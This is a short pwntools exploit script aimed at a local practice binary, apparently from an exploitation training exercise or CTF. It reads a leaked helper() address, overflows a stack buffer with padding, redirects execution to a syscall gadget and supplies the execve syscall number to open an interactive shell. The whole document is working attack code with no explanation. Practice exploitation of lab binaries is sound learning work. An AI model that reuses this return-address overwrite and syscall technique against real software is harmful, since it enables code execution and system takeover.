from pwn import *


binary = "../x86_binaries/x86_pie"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
SYSCALL_NO = 0x3b

helper_addr = int(p.readline().strip(),16)
print(f'helper(): {hex(helper_addr)}')

payload = flat(
    b'a'*0x28,
    p64(helper_addr+4),                     # syscall address
)
p.sendline(payload+b'a'*(0x60-len(payload)))

p.sendline(str(SYSCALL_NO).encode())        # syscall number for execve

p.interactive()